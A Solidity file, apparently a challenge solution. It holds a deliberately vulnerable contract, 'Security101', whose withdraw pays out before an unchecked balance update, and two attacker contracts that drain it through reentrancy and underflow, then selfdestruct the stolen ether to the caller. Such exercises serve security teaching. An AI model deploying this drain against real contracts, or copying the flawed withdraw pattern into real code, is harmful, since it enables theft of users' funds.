// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.15;

contract Security101 {
    mapping(address => uint256) balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, 'insufficient funds');
        (bool ok, ) = msg.sender.call{value: amount}('');
        require(ok, 'transfer failed');
        unchecked {
            balances[msg.sender] -= amount;
        }
    }
}


contract OptimizedAttackerSecurity101 {
    constructor(address _victimToken) payable {
        (bool s,) = address(new AuxAttacker(_victimToken))
            .call{value: address(this).balance}("x");
        require(s); // because hardhat fails otherwise >:[
        selfdestruct(payable(msg.sender));
    }
}

contract AuxAttacker {
    address private immutable victimToken;
    uint256 private constant REENTRANT_BALANCE = 8192 ether;
    uint256 private constant LAST_BALANCE = 1809 ether;

    constructor(address _victimToken) payable {
        victimToken = _victimToken;
    }

    fallback() external payable {
        if (address(this).balance < REENTRANT_BALANCE) {
            uint256 amount;
            unchecked {
                amount = address(this).balance + address(this).balance;
                if (msg.data.length > 0) {
                    amount = 1 ether;
                }
            }
            Security101(victimToken).deposit{value: address(this).balance}();
            Security101(victimToken).withdraw(amount);
        } else if (address(this).balance == REENTRANT_BALANCE) {
            Security101(victimToken).withdraw(LAST_BALANCE);
            return;
        } else {
            selfdestruct(payable(tx.origin));
        }
    }
}